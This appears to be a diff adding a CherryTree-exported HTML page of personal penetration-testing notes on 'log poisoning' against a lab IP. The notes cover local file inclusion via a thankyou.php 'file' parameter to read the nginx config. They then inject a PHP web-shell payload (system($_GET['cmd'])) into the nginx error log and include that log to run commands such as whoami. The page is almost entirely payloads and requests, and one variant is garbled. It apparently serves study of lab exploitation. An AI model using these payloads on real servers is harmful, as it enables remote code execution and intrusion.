@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>Log Poisioning</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>Log Poisioning</h1><br/>look for a config file (192.168.11.131/thankyou.php?file=/etc/nginx/nginx.conf)<br />in the config file look for .log things (access_log /var/log/nginx/access.log)<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />This method of log poisioning puts a variable into /var/log/nginx/error.log. From there you can run commands!<br /><br />GET /thankyou.php?file=&lt;?php system($_GET[&#39;cmd&#39;])?&gt;<br /><br /><br />&lt;?php system($_GET[&#39;cmd&#39;])?&gt;<br /><br />&lt;?fphp+system($_GET[&#39;cmd&#39;])+?&gt;<br /><br />/var/log/nginx/error.log&amp;cmd=whoami<br /><br /><br /><br /><br /><br /><br /></div></body></html>
